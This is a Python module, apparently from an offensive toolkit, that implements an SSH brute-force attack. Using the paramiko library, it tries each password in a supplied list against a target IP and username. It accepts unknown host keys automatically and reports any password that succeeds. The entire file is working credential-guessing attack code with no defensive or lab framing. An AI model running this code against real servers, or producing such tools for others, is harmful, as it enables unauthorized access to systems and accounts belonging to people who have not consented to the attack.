# modules/brute_force.py

import paramiko  # SSH client library

def ssh_brute_force(ip, username, password_list):
    """
    Attempts SSH brute force attack with a list of passwords.
    Args:
        ip (str): Target IP address
        username (str): SSH username
        password_list (list): List of passwords to try
    """

    print(f"\n[+] Starting SSH Brute Force on {ip} with username '{username}'\n")

    # Create SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Accept unknown host keys

    for password in password_list:
        try:
            # Attempt connection with current password
            ssh.connect(ip, username=username, password=password, timeout=3)

            print(f"    [SUCCESS] Password Found: {password}")
            ssh.close()
            return

        except paramiko.AuthenticationException:
            # Wrong password
            print(f"    [FAILED] {password}")

        except Exception as e:
            # Any other connection error
            print(f"    [ERROR] {password} → {e}")

    print("[!] Password not found in list.")

